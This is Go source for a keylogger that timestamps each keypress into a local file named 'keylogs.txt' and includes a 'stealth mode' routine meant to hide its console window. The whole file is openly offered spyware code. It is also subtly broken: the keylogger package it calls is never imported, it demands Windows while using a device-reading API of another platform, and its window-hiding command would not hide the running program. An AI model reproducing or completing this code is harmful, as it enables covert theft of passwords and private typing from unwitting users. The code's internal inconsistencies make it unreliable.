package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// Set log file path
const logFilePath = "keylogs.txt"

func init() {
	// Clear old logs on each run (Optional)
	err := os.Remove(logFilePath)
	if err != nil && !os.IsNotExist(err) {
		log.Fatalf("Error clearing old logs: %v", err)
	}
}

// Launches the keylogger
func startKeylogger() {
	// Check if running on Windows
	if runtime.GOOS != "windows" {
		log.Fatalf("This keylogger is designed for Windows.")
	}

	keyboard := keylogger.FindKeyboardDevice()
	if keyboard == "" {
		log.Fatal("No keyboard device found.")
	}

	// Open device and defer close
	k, err := keylogger.New(keyboard)
	if err != nil {
		log.Fatalf("Error opening keyboard device: %v", err)
	}
	defer k.Close()

	events := k.Read() // Channel for keypress events

	logFile, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Error opening log file: %v", err)
	}
	defer logFile.Close()

	fmt.Println("Keylogger started. Logging keystrokes...")

	// Start reading key events
	for e := range events {
		if e.Type == keylogger.EvKey && e.KeyPress() {
			logEntry := fmt.Sprintf("[%s] Key: %s\n", time.Now().Format(time.RFC3339), e.KeyString())
			logFile.WriteString(logEntry)
		}
	}
}

func hideConsoleWindow() {
	// Hide the console window on Windows (stealth mode)
	cmd := exec.Command("cmd", "/c", "powershell -WindowStyle Hidden -Command {}")
	cmd.Start()
}

func main() {
	hideConsoleWindow() // Hide the console (Optional)

	fmt.Println("Launching keylogger...")
	startKeylogger()
}
